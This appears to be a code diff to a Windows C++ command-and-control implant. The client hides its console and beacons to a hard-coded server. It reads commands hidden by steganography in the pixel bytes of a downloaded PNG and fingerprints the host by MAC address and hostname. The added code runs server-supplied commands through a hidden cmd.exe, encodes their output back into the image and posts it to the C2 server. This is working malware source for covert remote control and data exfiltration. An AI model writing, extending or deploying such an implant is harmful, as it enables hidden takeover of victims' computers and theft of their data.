@@ -6,19 +6,33 @@
 #pragma comment(lib, "WindowsCodecs.lib")
 #include <atlbase.h>
 #include <atlcoll.h>
+#include <iphlpapi.h>
+#include <atlstr.h>
+#pragma comment(lib, "iphlpapi.lib")
 
-
+//Image Properties
+typedef struct imageProps {
+	UINT frameCount;		//Framecount (1 for PNGs, including this in now for future compatibility with other file formats)
+	UINT width;				//width fo the image
+	UINT height;			//Height of the image
+	UINT stride;			//Stride of image
+	GUID pixelFormat;	//Used to store the pixel format (Should be BGRA - 32bits)
+}imageProps;
 
 
 
 // To hide the console window I modified compiler settings as follows: Under linker set Subsystem to /SUBSYSTEM:windows  and Entry point to: mainCRTStartup
 UINT GetStride(const UINT width, const UINT bitCount);
-HRESULT getCommands(std::string *commands);
-size_t executeCommands(std::vector<std::string>*);
+HRESULT readImage(CAtlArray<BYTE> *buffer, imageProps *props);
+HRESULT writeImage(CAtlArray<BYTE>* buffer, imageProps* props);
+HRESULT decodeCommands(std::string *commands, CAtlArray<BYTE>* buffer);
+HRESULT encodeImage(std::string* data, CAtlArray<BYTE>* buffer);
+int getID(std::string* ID);
+size_t executeCommands(std::vector<std::string>* commands, client *context);
 size_t parseCommands(std::vector<std::string>* commandList, std::string commandHeader);
 
 //Struct Types for command
-//Command sequence: <COM: TYPE-VALUE:TYPE-VALUE....etc>
+//Command sequence: <COM:TYPE-VALUE:TYPE-VALUE>....etc>
 
 enum TYPE {
 	KILL, //0-0
@@ -26,18 +40,23 @@ enum TYPE {
 	GATH, //2-INF
 	SHELL,//3-0
 	EXEC, //4-COMMAND
+	INIT, //5-0
 };
 
 //Global Variables
 bool COInit = FALSE;				//COInit can only be initialized once
-std::string ID = "ASAFW";
+std::string ID;
 unsigned long int beaconTime = 0;	//How often client beacans out to server
 std::string hostname = "10.0.0.35";
 std::string port = "8080";
 std::string path = "/images/default.png";
+std::wstring localPath;
 
 int main()
 {	
+	CAtlArray<BYTE> buffer;					//Buffer to hold image
+	imageProps props;						//Properties for image
+	IPropertyBag2 *pBag;
 	std::string commands;					//String to hold commands (Used to grab all encoded commands from image)
 	std::vector<std::string> commandList;	//Vector to store each individual command
 	HRESULT HR;								//Error handler for COM Objects
@@ -51,10 +70,15 @@ int main()
 	client clientC;
 	//Initialize client (Only need to initialize WSA once)
 	clientC.clientInit();
+	localPath = clientC.filePath;
 
+	//Get UNIQUE ID
+	if (getID(&ID) == -1) {
+		ID = "NULL";
+	}
 	//Loop Forever here
 	while (true) {
-		//Sleep (Initial sleep is 0
+		//Sleep (Initial sleep is 0)
 		Sleep(beaconTime);
 		//Connect to server
 		if (clientC.clientConn(&clientC, hostname, port)) {
@@ -70,10 +94,17 @@ int main()
 		}
 		//Decode the image and get the commands
 
-		if ((HR = getCommands(&commands)) != S_OK) {
-			OutputDebugStringA("Server: Unable to grab encoded commands\n");
+		if ((HR = readImage(&buffer, &props)) != S_OK) {
+			buffer.RemoveAll();
+			OutputDebugStringA("Server: Unable to decodeImage\n");
 			continue;
 		}
+		if ((HR = decodeCommands(&commands, &buffer)) != S_OK) {
+			buffer.RemoveAll();
+			OutputDebugStringA("Server: Unable to decodeCommands\n");
+			continue;
+		}
+		buffer.RemoveAll();
 		//Parse Command header
 		if (parseCommands(&commandList, commands) == -1) {
 			OutputDebugStringA("Server: Unable to parse commands\n");
@@ -83,7 +114,7 @@ int main()
 			continue;
 		}
 		//Execute commangs grabbed
-		executeCommands(&commandList);
+		executeCommands(&commandList, &clientC);
 		//Clear Commands
 		commands = "";
 		commandList.clear();
@@ -97,15 +128,9 @@ int main()
 
 
 //Grab Encoded commands from Image
-HRESULT getCommands(std::string *commands ) {
+HRESULT readImage(CAtlArray<BYTE> *buffer, imageProps* props) {
 	//Initialize Variables
-	size_t commandL;			 //Size in bytes to parse
-	std::string command;		//String to store encoded command
 	HRESULT hr;					//Error handling 
-	UINT frameCount = 0;		//Framecount (1 for PNGs, including this in now for future compatibility with other file formats)
-	UINT width = 0;				//width fo the image
-	UINT height = 0;			//Height of the image
-	GUID pixelFormat = { 0 };	//Used to store the pixel format (Should be BGRA - 32bits)
 	//create a CComPtr Istream smart pointer for managing the COM interface
 	CComPtr<IStream> stream;
 	//Create a smart pointer gain acces to the decoder's properties
@@ -113,7 +138,7 @@ HRESULT getCommands(std::string *commands ) {
 	//Smart pointer to gain access to interface that defines methods for decoding individual image frames
 	CComPtr<IWICBitmapFrameDecode> frame;
 	//Open file and retrieve a stream to read from the file
-	if ((hr = SHCreateStreamOnFileEx(L"temp.png", STGM_READ, FILE_ATTRIBUTE_NORMAL, FALSE, NULL, &stream)) != S_OK) {
+	if ((hr = SHCreateStreamOnFileEx(localPath.c_str(), STGM_READ, FILE_ATTRIBUTE_NORMAL, FALSE, NULL, &stream)) != S_OK) {
 		stream.Release();
 		return hr;
 	}
@@ -128,7 +153,7 @@ HRESULT getCommands(std::string *commands ) {
 		return hr;
 	}
 	//Grab the frame count
-	if ((hr = decoder->GetFrameCount(&frameCount)) != S_OK) {
+	if ((hr = decoder->GetFrameCount(&props->frameCount)) != S_OK) {
 		stream.Release();
 		return hr;
 	}
@@ -138,41 +163,116 @@ HRESULT getCommands(std::string *commands ) {
 		return hr;
 	}
 	//From the frame determine the width and height
-	if ((hr = frame->GetSize(&width, &height)) != S_OK) {
+	if ((hr = frame->GetSize(&props->width, &props->height)) != S_OK) {
 		stream.Release();
 		return hr;
 	}
 	//Grab the pixel format
-	if ((hr = frame->GetPixelFormat(&pixelFormat)) != S_OK) {
+	if ((hr = frame->GetPixelFormat(&props->pixelFormat)) != S_OK) {
 		stream.Release();
 		return hr;
 	}
 	//Validate pixel format. This project only supports 32 bit BGRA PNG files at the moment.
-	if (pixelFormat != GUID_WICPixelFormat32bppBGRA) {
+	if (props->pixelFormat != GUID_WICPixelFormat32bppBGRA) {
 		stream.Release();
 		return hr;
 	}
 	//Get the stride
-	const UINT stride = GetStride(width, 32);
+	props->stride = GetStride(props->width, 32);
 	//A CAtlArray will be used to store the image data
-	//The Destructor will clean this up for us once the object goes out of context
-	CAtlArray<BYTE> buffer;
 	//Set the size of the array object to the size of the image
-	buffer.SetCount(stride * height);
+	buffer->SetCount(props->stride * props->height);
 	//Copy the frame pixels to the CAtlArray buffer
-	hr = frame->CopyPixels(0, stride, buffer.GetCount(), buffer.GetData());
-	//Grab Length of the command hidden int he pixel (In Bytes). It will always be the lease significant byte of the BGR value (3rd pixel)
-	commandL = buffer[2];
-	//Iterate through the pixels and grab the least significant bytes of the BGR value (Since this is BGRA, we will be gabbing the red pixel value)
-	for (int i = 1; i <= commandL;i++) {
-		command += buffer[i*4+2];
-	}
-	*commands = command;
+	hr = frame->CopyPixels(0, props->stride, buffer->GetCount(), buffer->GetData());
 	//Release the stream.
 	stream.Release();
 	return hr;
-
 }//CComPtr auto releases underlying IErrorInfo interface
+//Decode commands from image
+HRESULT decodeCommands(std::string* commands, CAtlArray<BYTE>* buffer) {
+	size_t commandL;			 //Size in bytes to parse
+	std::string command;		//String to store encoded command
+	//Grab Length of the command hidden int he pixel (In Bytes). It will always be the lease significant byte of the BGR value (3rd Byte)
+	commandL = buffer->GetAt(2);
+	//Iterate through the pixels and grab the least significant bytes of the BGR value (Since this is BGRA, we will be gabbing the red pixel value)
+	for (int i = 1; i <= commandL;i++) {
+		command += buffer->GetAt(i * 4 + 2);
+	}
+	*commands = command;
+	return S_OK;
+}
+//Write encoded data to image file
+HRESULT writeImage(CAtlArray<BYTE>* buffer, imageProps *props) {
+	//Initialize Variables
+	HRESULT hr;					//Error handling 
+	//create a CComPtr Istream smart pointer for managing the COM interface
+	CComPtr<IStream> stream;
+	//Create a smart pointer gain acces to the decoder's properties
+	CComPtr<IWICBitmapEncoder> encoder;
+	//Smart pointer to gain access to interface that defines methods for decoding individual image frames
+	CComPtr<IWICBitmapFrameEncode> frame;
+	//
+	IPropertyBag2* pPropertyBag = NULL;
+	//Create stream from buffer
+	if ((hr = SHCreateStreamOnFileEx(localPath.c_str(), STGM_WRITE | STGM_CREATE, FILE_ATTRIBUTE_NORMAL, FALSE, NULL, &stream)) != S_OK) {
+		stream.Release();
+		return hr;
+	}
+	//Create an instance of a COM object to the WICPNG Encoder interface
+	if ((hr = encoder.CoCreateInstance(CLSID_WICPngEncoder)) != S_OK) {
+		stream.Release();
+		return hr;
+	}
+	//Initialize the png decoder with the encoded png stream
+	if ((hr = encoder->Initialize(stream, WICBitmapEncoderNoCache)) != S_OK) {
+		stream.Release();
+		return hr;
+	}
+	//Grab the frame count
+	if ((hr = encoder->CreateNewFrame(&frame, &pPropertyBag)) != S_OK) {
+		stream.Release();
+		return hr;
+	}
+	if ((hr = frame->Initialize(pPropertyBag)) != S_OK) {
+		stream.Release();
+		return hr;
+	}
+	//Set Frame properties
+	if ((hr = frame->SetSize(props->width, props->height)) != S_OK) {
+		stream.Release();
+		return hr;
+	}
+	//
+	if ((hr = frame->SetPixelFormat(&props->pixelFormat)) != S_OK) {
+		stream.Release();
+		return hr;
+	}
+
+	if ((hr = frame->WritePixels(props->height,props->stride, buffer->GetCount(), buffer->GetData())) != S_OK) {
+		return hr;
+	}
+
+	if ((hr = frame->Commit()) != S_OK) {
+		return hr;
+	}
+	if ((hr = encoder->Commit()) != S_OK){
+		return hr;
+	}
+	return hr;
+}//CComPtr auto releases underlying IErrorInfo interface
+//Encode image with data
+HRESULT encodeImage(std::string* data, CAtlArray<BYTE>* buffer) {
+
+	size_t lsb = (byte)(data->length() & 0xFFu);
+	size_t msb = (byte)((data->length() >> 8) & 0xFFu);
+	buffer->SetAt(2, lsb);
+	buffer->SetAt(6, msb);
+	//Iterate through the pixels and set the value of the red pixel byte
+	for (int i = 2; i-1 <= data->length();i++) {
+		buffer->SetAt(i * 4 + 2,data->at(i-2));
+	}
+	return S_OK;
+}
 //Parse Command Header for all commands in the encoded message;
 size_t parseCommands(std::vector<std::string>* commandList, std::string commandHeader) {
 	int currentPos = 0;	//Tail
@@ -197,15 +297,15 @@ size_t parseCommands(std::vector<std::string>* commandList, std::string commandH
 	return 0;
 }
 //Execute Commands
-size_t executeCommands(std::vector<std::string>* list) {
+size_t executeCommands(std::vector<std::string>* list, client* context) {
 	std::string varName;
 	std::string varValue;
 	//Iterate through commands and call them (Will need parsing later);
 	for (auto n : *list) {
 		//Grab the ID to see if commands are meant for this client, or if we need to ignore them
-		if (n.find_first_of("-") == std::string::npos && n == list->at(0)){
+		if (n == list->at(0)){
 			if (n == ID || n == "ALL") {
-				OutputDebugStringA("Commands are meant for this client");
+				OutputDebugStringA("Commands are meant for this client\n");
 				continue;
 			}else{
 				OutputDebugStringA("Commands not meant for this client\n");
@@ -237,24 +337,109 @@ size_t executeCommands(std::vector<std::string>* list) {
 					beaconTime = atoi(varValue.c_str());
 				}
 				break;
-			//Case GATH: Gather information and execute a post request to the server
-			case GATH:
-				break;
 			//Establish a persistent connection to the server
 			case SHELL:
 				break;
 			//Execute a Command
 			case EXEC:
-				char buff[4096];
-				std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(value.c_str(), "rt"), &_pclose);
-				if (!pipe) {
-					OutputDebugStringA("Failed to execute system command\n");
+			{
+				std::wstring wValue;
+				WCHAR* commArg;
+				STARTUPINFO si = { sizeof(si) };
+				PROCESS_INFORMATION pi;
+				CString output = L"<DATA:";						 //Store output from commArg
+				HANDLE hChildStdoutRd;				 //Used from parent process to Read output from ReadFile
+				HANDLE hChildStdoutWr;				 //Used from child process to write output to pipe
+				BOOL Status;						 //Status of Proccess/Pipe calls
+				//Create Security Attributes for pipe
+				SECURITY_ATTRIBUTES pipeSecAtt = { sizeof(SECURITY_ATTRIBUTES) };
+				pipeSecAtt.bInheritHandle = TRUE;	//Chile proccess inherits pipe handle
+				pipeSecAtt.lpSecurityDescriptor = NULL;
+
+				//Create PIPE
+				if (!::CreatePipe(&hChildStdoutRd, &hChildStdoutWr, &pipeSecAtt, 0)) {
+					OutputDebugStringA("Unable to create pipe");
+					break;
+				}
+				ZeroMemory(&si, sizeof(si));
+				ZeroMemory(&pi, sizeof(pi));
+				//Set attributes of StartupInfo
+				si.cb = sizeof(si);
+				si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; //USESTDHandles to *
+				si.hStdOutput = hChildStdoutWr;	//Requires STARTF_USESTDHANDLES in dwFlags
+				si.hStdError = hChildStdoutWr;  //Requires STARTF_USESTDHANDLES in dwFlags
+				si.wShowWindow = SW_HIDE;
+				wValue = L"cmd.exe /c "; 				//Base cmd syntax
+				//Append command arguments provided from server
+				wValue.append(std::wstring(value.begin(), value.end()));
+				//Convert command to a WCHAR * to pass into CreateProcess
+				commArg = (WCHAR *)wValue.c_str();
+				//Create Process
+				if (!::CreateProcess(nullptr, commArg, nullptr, nullptr, TRUE, 0, nullptr, nullptr, &si, &pi)) {
+					OutputDebugStringA("Error Creating Proccess\n");
 				}
 				else {
-					while (fgets(buff, sizeof(buff), pipe.get()) != nullptr) {
-						OutputDebugStringA(buff);
+					//Wait for process to finish (Maximum 20 seconds)
+					
+					DWORD wt = ::WaitForSingleObject(pi.hProcess, 20000);
+					if (wt == WAIT_TIMEOUT) {
+						break;
+						OutputDebugStringA("Unable to run command\n");
 					}
+					if (!::CloseHandle(hChildStdoutWr)) {
+						OutputDebugStringA("Unable to close stdout handle\n");
+						break;
+					}
+					DWORD dRead;
+					CHAR buff[4096];
+					while (ReadFile(hChildStdoutRd,buff,4096,&dRead,nullptr) > 0) {
+						output += CString(buff, dRead);
+					}
+					//Close proccess/threads
+					::CloseHandle(hChildStdoutRd);
+					::CloseHandle(pi.hProcess);
+					::CloseHandle(pi.hThread);
 				}
+				CAtlArray<BYTE> imageBuffers;
+				imageProps propsS;
+				//Convert CString to string
+				CT2CA conv(output);
+				std::string datas(conv);
+				readImage(&imageBuffers, &propsS);
+				encodeImage(&datas, &imageBuffers);
+				writeImage(&imageBuffers, &propsS);
+
+			    //Connect to server
+				if(context->clientConn(context, hostname, port)) {
+						continue;
+				}
+				//Send POST Request to C2
+				if (context->sendPost(context)) {
+					continue;
+				}
+				//Rcieve respone later
+				closesocket(context->sock);
+				break;
+			}
+			case INIT:
+				std::string init = "<INIT:";
+				init.append(ID);
+				init.append(">");
+				CAtlArray<BYTE> imageBuffers;
+				imageProps propsS;
+				readImage(&imageBuffers, &propsS);
+				encodeImage(&init, &imageBuffers);
+				writeImage(&imageBuffers, &propsS);
+				//Connect to server
+				if (context->clientConn(context, hostname, port)) {
+					continue;
+				}
+				//Send POST Request to C2
+				if (context->sendPost(context)) {
+					continue;
+				}
+				//Rcieve respone later
+				closesocket(context->sock);
 				break;
 		}
 		//Call System Commands
@@ -266,4 +451,43 @@ UINT GetStride(const UINT width, const UINT bitCount) {
 	const UINT byteCount = bitCount / 8;
 	const UINT stride = (width * byteCount);
 	return stride;
+}
+
+int getID(std::string* ID) {
+
+	PIP_ADAPTER_INFO AdapterInfo;
+	DWORD dwBufLen = sizeof(IP_ADAPTER_INFO);
+	char* mac_addr = (char*)malloc(18);
+	//Allocate buffer for Adapter Info
+	AdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
+	// Make an initial call to GetAdaptersInfo to get the necessary size into the dwBufLen variable
+	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == ERROR_BUFFER_OVERFLOW) {
+		free(AdapterInfo);
+		AdapterInfo = (IP_ADAPTER_INFO*)malloc(dwBufLen);
+	}
+	if (GetAdaptersInfo(AdapterInfo, &dwBufLen) == NO_ERROR) {
+		if (AdapterInfo->AddressLength < 6) {
+			free(AdapterInfo);
+			free(mac_addr);
+			return -1;
+		}
+		sprintf_s(mac_addr,18, "%02X%02X%02X%02X%02X%02X",
+			AdapterInfo->Address[0], AdapterInfo->Address[1],
+			AdapterInfo->Address[2], AdapterInfo->Address[3],
+			AdapterInfo->Address[4], AdapterInfo->Address[5]);
+		*ID = mac_addr;
+	}
+	//Cleanup before getting hostname
+	free(mac_addr);
+	free(AdapterInfo);
+	//Grab hostname
+	char* hostname = (char*)malloc(sizeof(char) * 1024);
+	if (gethostname(hostname, 1024) != 0) {
+		free(hostname);
+		return -1;
+	}
+	ID->append("-");
+	*ID += hostname;
+	free(hostname);
+	return 0;
 }
